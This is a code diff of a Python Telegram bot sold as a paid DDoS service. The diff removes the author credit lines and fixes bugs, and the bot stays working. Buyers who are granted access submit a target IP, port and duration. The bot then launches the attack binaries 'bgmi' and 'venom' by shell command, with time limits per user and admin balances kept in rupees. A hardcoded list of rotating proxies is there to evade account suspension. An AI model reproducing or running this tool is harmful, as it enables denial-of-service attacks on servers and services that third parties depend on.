@@ -1,5 +1,5 @@
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
+# DDoS Telegram Bot Script
+
 import telebot
 import subprocess
 import datetime
@@ -7,16 +7,18 @@ import os
 import time
 import json
 import shutil
+import random
+import logging
 from telebot import types
 from threading import Timer, Thread
 from requests.exceptions import ReadTimeout, ConnectionError
 
 # Load configuration
 CONFIG_FILE = 'config.json'
-ORIGINAL_BGMI_PATH = '/workspaces/venom-V5/bgmi'      #ADD YOUR FILES PATH HERE 
-ORIGINAL_VENOM_PATH = '/workspaces/venom-V5/bgmi2'    #ADD YOUR FILES PATH HERE 
+ORIGINAL_BGMI_PATH = '/workspaces/venom-V5/bgmi'      # ADD YOUR FILES PATH HERE 
+ORIGINAL_VENOM_PATH = '/workspaces/venom-V5/bgmi2'    # ADD YOUR FILES PATH HERE 
 
-def update_proxy():    #AUTOMATICALLY CHANGES YOUR IP AND SAVES YOU FROM SUSPEND OF GITHUB ACCOUNT AND ALSO CHANGES YOUR IP EVERY SECOND
+def update_proxy():    
     proxy_list = [
         "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
         "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
@@ -56,8 +58,6 @@ def load_config():
 def write_config(config):
     with open(CONFIG_FILE, 'w') as f:
         json.dump(config, f)
-
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
 
 config = load_config()
 bot = telebot.TeleBot(config['bot_token'])
@@ -126,10 +126,6 @@ def send_welcome(message):
     
     bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
 
-# Bot command handlers
-import shutil
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
 @bot.message_handler(commands=['add'])
 def add_user(message):
     if str(message.chat.id) in ADMIN_IDS:
@@ -147,13 +143,11 @@ def add_user(message):
                 config['admin_balances'] = admin_balances
                 write_config(config)
 
-# SCRIPT MADE BY venom ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-
                 # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'
                 user_venom_path = f'venom{user_id}'
-                venom.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-                venom.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
                 response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -170,9 +164,9 @@ def add_user(message):
                 config['admin_balances'] = admin_balances
                 write_config(config)
 
-                # Create copies of bgmi,sahil files for the new user
+                # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'              
-                user_sahil_path = f'venom{user_id}'
+                user_venom_path = f'venom{user_id}'
                 shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                 shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
@@ -184,9 +178,6 @@ def add_user(message):
     else:
         response = "ONLY OWNER CAN USE."
     bot.send_message(message.chat.id, response)
-
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT    
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -232,8 +223,6 @@ def show_all_users(message):
         response = "ONLY OWNER CAN USE."
     bot.send_message(message.chat.id, response)
 
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-
 @bot.message_handler(commands=['logs'])
 def show_recent_logs(message):
     if str(message.chat.id) in ADMIN_IDS:
@@ -249,14 +238,10 @@ def show_recent_logs(message):
 def show_user_id(message):
     bot.send_message(message.chat.id, f"🤖Your ID: {str(message.chat.id)}")
 
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-
-# Attack functionality
 def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
-    sahil_file = f"sahil{user_id}"
+    venom_file = f"venom{user_id}"
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
@@ -266,7 +251,6 @@ def start_attack(user_id, target, port, duration):
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
         subprocess.run(f"./{venom_file} {target} {port} {duration} 200", shell=True)
-      # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
     except Exception as e:
@@ -281,9 +265,6 @@ def handle_attack_button(message):
     else:
         bot.send_message(message.chat.id, "🚫 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
 
-    # SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-
 def handle_attack_details(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -291,7 +272,6 @@ def handle_attack_details(message):
             target, port, duration = message.text.split()
             duration = int(duration)
 
-            # Restrict attack duration for normal users
             MAX_DURATION = 240  # Set maximum duration (in seconds) for Normal users
             if user_id not in ADMIN_IDS and duration > MAX_DURATION:
                 bot.send_message(message.chat.id, f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
@@ -311,9 +291,6 @@ def handle_attack_details(message):
     else:
         bot.send_message(message.chat.id, "🚫 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! 🚫")
 
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT        
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-
 @bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
 def handle_my_info_button(message):
     user_id = str(message.chat.id)
@@ -329,9 +306,6 @@ def handle_my_info_button(message):
                 f"⏳ Approval Expiry: {expiry if expiry else 'N/A'}\n"
                 f"💰 Balance Rs: {balance} INR.")
     bot.send_message(message.chat.id, response)
-
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast(message):
@@ -367,634 +341,3 @@ if __name__ == '__main__':
             time.sleep(1)
 
 
-    # SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#CREDIT DELETE MAT KARNA BHAI (DON'T DELETE THE CREDIT THE CREATOR @SAHILMODZOWNER)
-#CREDIT DELETE MAT KARNA BHAI (DON'T DELETE THE CREDIT THE CREATOR @SAHILMODZOWNER)
